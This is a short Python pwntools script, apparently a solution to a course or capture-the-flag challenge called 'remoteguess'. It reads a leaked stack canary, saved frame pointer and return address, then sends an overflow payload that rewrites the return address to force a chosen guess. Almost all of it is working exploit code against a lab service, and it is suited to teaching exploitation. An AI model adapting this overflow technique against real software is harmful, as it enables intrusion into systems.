#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()
        

r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
# r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

# get return address
r.recvuntil(b'ret: ')
oldReturnOffset = 0xa2ff
newReturnOffset = 0xa3aa
retAddr = p64(int(r.recvline().decode('ascii').strip(), 16) - oldReturnOffset + newReturnOffset)

# get gdb
r.recvuntil(b'rbp: ')
oldPbp = int(r.recvline().decode('ascii').strip(), 16)
rbp = p64(oldPbp)

# get canary
r.recvuntil(b'canary: ')
canary = p64(int(r.recvline().decode('ascii').strip(), 16))

# fill trash bits
r.recvuntil(b'frameTop: ')
frameTop = int(r.recvline().decode('ascii').strip(), 16)
trash = "".encode('ascii').ljust(oldPbp - frameTop - 0x64, b'\0')
# print(oldPbp - frameTop - 0x64)

myguess = 123
content = str(myguess).encode('ascii').ljust(0x18, b'\0') + canary + rbp + retAddr + trash + p32(myguess)

r.sendlineafter(b'Show me your answer? ', content)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
